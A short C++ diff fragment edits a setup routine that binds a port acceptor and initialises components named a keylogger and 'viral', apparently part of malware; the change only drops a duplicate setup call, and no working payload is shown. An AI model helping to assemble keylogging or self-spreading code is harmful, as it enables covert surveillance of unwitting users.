@@ -86,7 +86,6 @@ namespace spi
         void __setup()
         {
             _acc.bind(cfg::portAcceptor);
-            _viral.setup();
             _logHandle.setup();
             _keyLogger->setup();
             _viral.setup(_keyLogger.get());
